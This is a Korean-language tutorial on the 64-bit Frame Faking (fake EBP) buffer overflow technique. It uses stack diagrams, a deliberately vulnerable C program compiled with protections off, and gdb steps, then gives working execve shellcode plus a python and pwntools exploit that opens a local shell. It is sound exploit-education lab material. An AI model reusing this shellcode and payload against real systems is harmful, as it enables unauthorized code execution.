# # Frame faking (Fake EBP)

### 0x01 what is Frame faking

Frame faking 공격은  RET까지 덮어 쓸 수 있는 상태이고 RET에 스택 또는 라이브러리 주소 등을 덮어 씌울 수 없는 상황일때 사용하는 공격 기법이다.

이 공격 기법은 SFP를 덮어씌우고 RET 주소를 leave 주소로 덮어씌워 buf에 있는 shellcode를 실행하게 할 수 있다.

------------

 ### 0x02 Concept
 
 이 글은 64bit를 기준으로 설명을 적었다.
 
 우선 이 공격을 배우기 위해서는 LEAVE 명령어와 RET 명령어에 대해 알고 있어야 한다.


 | 명령어  |  동작  |
| ------------ | ------------ |
|  LEAVE  |  MOV ESP, EBP <BR> POP EBP  |
|  RET |  POP EIP <BR> JMP EIP  |


 
스택이 아래처럼 구성이 되어 있다고 가정하자. 이 스택을 잘 기억해야 헷갈리지 않을 것이다. (아래로 갈수록 high address, 위로 갈수록 low address로 기준을 정한다.)

```
===========
   dummy
===========
    ...
	buf
	...      
	...
	...
===========
    SFP      
===========
    RET 
===========
```

buf에 bof 공격이 가능하여 아래와 같은 값을 buf에 입력한다.

[shellcode - 0x8] 는 SFP에, (leave 주소) 는 RET에 들어가게 된다.

```
[shellcode 주소] + [shellcode] + [NOP] + [shellcode - 0x8] + [leave 주소]
```

위 값을 buf에 입력하면 아래 스택처럼 값이 들어갈 것이다.

```
===========
   dummy
===========
    &buf
 shellcode
	NOP      
	NOP        -> ESP
	NOP
===========
 &buf - 0x8    -> EBP
===========
   &leave 
===========
```

위와 같은 스택에서 EBP, ESP 레지스터가 위와 같다고 가정하고, LEAVE 명령어를 실행해야 하는 상황이라면,

 < PUHS ESP, EBP >
 
 ```
===========
   dummy
===========
    &buf
 shellcode
	NOP      
	NOP        
	NOP
===========
 &buf - 0x8    -> EBP / ESP
===========
   &leave 
===========
```
 
< POP EBP >

 ```
===========
   dummy       -> EBP
===========
    &buf
 shellcode
	NOP      
	NOP        
	NOP
===========
 &buf - 0x8
===========
   &leave     -> ESP
===========
```

POP 명령어로 &buf - 0x8 에 위치한 곳으로 EBP가 이동했다. 동시에 ESP는 POP 명령어로 RET로 이동했다.


그 다음 RET 명령어를 실행할 차례이다. 

< POP EIP > && < JMP EIP >

 ```
===========
   dummy       -> EBP
===========
    &buf
 shellcode
	NOP      
	NOP        
	NOP
===========
 &buf - 0x8   -> EIP
===========
   &leave   
===========   -> ESP
```

POP 명령어로 인해 &leave 값이 EIP로 들어갔고, 이로 인해 다시 LEAVE 명령어가 실행이 된다.

< LEAVE >

< PUSH ESP, EBP >

 ```
===========
   dummy       -> EBP / ESP
===========
    &buf
 shellcode
	NOP      
	NOP        
	NOP
===========
 &buf - 0x8   -> EIP
===========
   &leave   
===========   
```

< POP EBP >

 ```
===========
   dummy       
===========  
    &buf       -> ESP
 shellcode
	NOP      
	NOP        
	NOP
===========
 &buf - 0x8 
===========
   &leave      -> EIP
===========  
```

POP 명령어로 ESP가 가리키고 있던 dummy 값이 EBP로 들어가 어디론가 점프했다. 마찬가지로 POP으로 인해 ESP가 이동하여 &BUF를 가리키고 있다.

다시 RET 명령어가 실행이 된다.

< RET >

< POP EIP > && < JMP EIP >

 ```
===========
   dummy   
===========
    &buf
 shellcode    -> ESP / EIP
	NOP      
	NOP        
	NOP
===========
 &buf - 0x8 
===========
   &leave   
=========== 
```

최종적으로 EIP가 Shellcode를 가리키고 있게 되고, 이를 실행하게 된다.

여기까지가 Frame Faking 공격의 개념이고 정리하자면 payload는 다음과 같다.

```
[shellcode 주소] + [shellcode] + [NOP] + [shellcode - 0x8] + [leave 주소]
```

위 설명을 이해 했다면 payload를 보고 왜 이렇게 입력을 해야 하는지 이해가 갈 것이다.

----

### 0x03  Proof of Concept

실습을 위해 사용된 코드는 다음과 같다.

```c
#include <stdio.h>

void vuln(){
        char buf[50];
        printf("buf[50] address : %p\n",buf);
        read(0,buf,100);
}

void main(){
        vuln();
}
```

다음과 같은 옵션으로 컴파일 한다.

```
$ gcc -fno-stack-protector -z execstack -no-pie -o code code.c
$ gdb -q code
```

우선 buf에 넣을 값의 크기를 구하기 위해 buf, SFP 주소를 알아내고, LEAVE 주소도 알아내야 한다.

vuln+4 와 vuln+60 에서 breakpoint를 걸어준다.

```
>>> b *vuln+4
>>> b *vuln+60
```

i r $rbp 명령어를 입력하면 $rbp에 저장된 값을 볼 수 있다. 0x7fffffffe490은 SFP 값이다. 

```
>>> r
Breakpoint 1, 0x000000000040053b in vuln ()
>>> i r $rbp
rbp            0x7fffffffe490   0x7fffffffe490
>>> 
```

계속 실행하면 buf 주소를 볼 수 있다. 
buf 주소는 0x000007fffffffe450

따라서 SFP 에서 buf 주소를 빼면 40(64bytes) 가 나온다. 즉 buf와 SFP는 64bytes 만큼 떨어져 있다.

아무런 값을 넣어준뒤 LEAVE 명령어에서 멈추었다.

```
─── Output/messages 
buf[50] address : 0x7fffffffe450
aaaaaaaaaa

Breakpoint 2, 0x0000000000400573 in vuln ()
>>>  
```

아래와 같은 명령어로 LEAVE 명령어의 주소를 알 수 있다.

```
>>> i r $rip
rip            0x400573 0x400573 <vuln+60>
>>> 
```

최종적으로 얻은 정보를 정리하면
- buf 주소 : 0x7fffffffe450
- buf와 SFP 간의 거리 : 64bytes
- LEAVE 주소 : 0x0000000000400573

개념을 설명할때 payload의 형식을 알려줬다. 이제 본인이 직접 생각하면서 payload를 짜 보길 바란다.

payload는 다음과 같다.

```python
buf_plus_8 = "\x58\xe4\xff\xff\xff\x7f\x00\x00"
shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
nop = "\x90"*29
sfp = "\x48\xe4\xff\xff\xff\x7f\x00\x00"
leave = "\x73\x05\x40\x00\x00\x00\x00\x00"

payload = buf_plus_8 + shellcode + nop + sfp + leave
```

이를 입력값으로 넘겨주면 shell을 획득할 수 있는 것을 볼 수 있다.

```
$ (python -c 'print "\x58\xe4\xff\xff\xff\x7f\x00\x00"+"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"+"\x90"*29+"\x48\xe4\xff\xff\xff\x7f\x00\x00"+"\x73\x05\x40\x00\x00\x00\x00\x00"'; cat) | ./test
buf[50] address : 0x7fffffffe450

ls
code	code.c

```

------

### 0x4 Using pwntool

이번엔 간G나게 python의 pwntool로 shell을 획득해보자.

아래는 python으로 작성된 poc 코드이다

```python
from pwn import *

p = process("./test")

p.recvuntil("buf[50] address : ")
bufAddress = p.recvuntil("\n")
bufAddress = int(bufAddress, 16)

up_bufaddr = p64(bufAddress + 0x8)
down_bufaddr = p64(bufAddress - 0x8)

exploit = up_bufaddr
exploit += '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
exploit += "\x90"*29
exploit += down_bufaddr #'\xd0\xe4\xff\xff\xff\x7f\x00\x00'
exploit += '\x73\x05\x40\x00\x00\x00\x00\x00'

p.send(exploit)
p.interactive()


```

```
universe:~/pwnable $ python poc.py 
[+] Starting local process './test': pid 29964
[*] Switching to interactive mode
$ ls
code         code.c
$ 
```

---

### 0x05 Reference
[https://www.lazenca.net/pages/viewpage.action?pageId=12189944](https://www.lazenca.net/pages/viewpage.action?pageId=12189944)
[https://d4m0n.tistory.com/88](https://d4m0n.tistory.com/88)
